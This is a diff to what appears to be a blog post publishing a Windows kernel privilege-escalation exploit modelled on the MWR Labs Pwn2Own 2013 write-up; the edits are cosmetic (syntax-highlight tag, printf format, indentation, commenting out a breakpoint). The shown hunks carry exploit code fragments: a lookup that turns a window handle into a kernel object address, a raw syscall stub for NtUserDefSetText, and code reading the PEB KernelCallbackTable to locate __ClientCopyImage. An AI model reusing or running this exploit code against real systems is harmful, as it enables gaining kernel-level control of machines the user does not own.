@@ -21,8 +21,7 @@ Referenaces
 * https://labs.mwrinfosecurity.com/blog/2013/09/06/mwr-labs-pwn2own-2013-write-up---kernel-exploit/
 
 
-{% highlight shell %}
-
+{% highlight cpp %}
 #include <windows.h>
 #include <stdio.h>
 
@@ -118,7 +117,7 @@ HWND GetKernelHandle(HWND hwnd)
             if (kernelWindowHandle == hwnd)
             {
                 kernelWindowHandle = (HWND)UserHandleTable[i].phead;
-                printf("[+] Kernel Window Handle found @ %#p\r\n", kernelWindowHandle);
+                printf("[+] Kernel Window Handle found %p\r\n", kernelWindowHandle);
                 return kernelWindowHandle;
             }
         }
@@ -172,10 +171,10 @@ __declspec(naked) BOOL NTAPI NtUserDefSetText(
 {
     __asm
     {
-            mov     eax, 116Dh
-			mov     edx, 7FFE0300h	
-			call    dword ptr [edx]
-			retn    8
+        mov     eax, 116Dh
+		mov     edx, 7FFE0300h	
+		call    dword ptr [edx]
+		retn    8
     }
 }
 
@@ -319,7 +318,7 @@ void *Get__ClientCopyImageAddressInPEB()
         mov     eax,dword ptr [eax+2Ch] // EAX=KernelCallbackTable
 		add	  eax,edx
 		mov	  address,eax;
-		int 3
+		//  int 3
 
     }
 
